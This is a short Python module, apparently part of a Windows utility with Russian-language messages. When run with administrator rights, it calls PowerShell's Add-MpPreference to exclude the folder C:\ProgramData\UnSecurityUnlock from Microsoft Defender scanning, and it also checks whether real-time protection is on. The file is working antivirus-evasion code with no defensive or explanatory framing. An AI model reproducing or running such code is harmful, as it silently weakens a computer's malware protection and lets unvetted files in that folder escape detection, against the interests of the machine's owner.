import subprocess
import ctypes
from typing import List

from .logger import logger

EXCLUSION_PATHS = [r"C:\ProgramData\UnSecurityUnlock"]


def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _run(cmd: List[str]):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return -1, str(e)


def add_defender_exclusions() -> List[str]:
    if not is_admin():
        return ["Нужны права администратора для изменения исключений Defender."]
    results = []
    for path in EXCLUSION_PATHS:
        code, out = _run([
            "powershell", "-NoProfile", "-Command",
            f"Add-MpPreference -ExclusionPath '{path}'"
        ])
        results.append(f"{'OK' if code == 0 else 'FAIL'}: {path} {out.strip()[:100]}")
    return results


def check_defender_status() -> str:
    code, out = _run([
        "powershell", "-NoProfile", "-Command",
        "Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled"
    ])
    if code == 0:
        return out.strip()
    return "unknown"
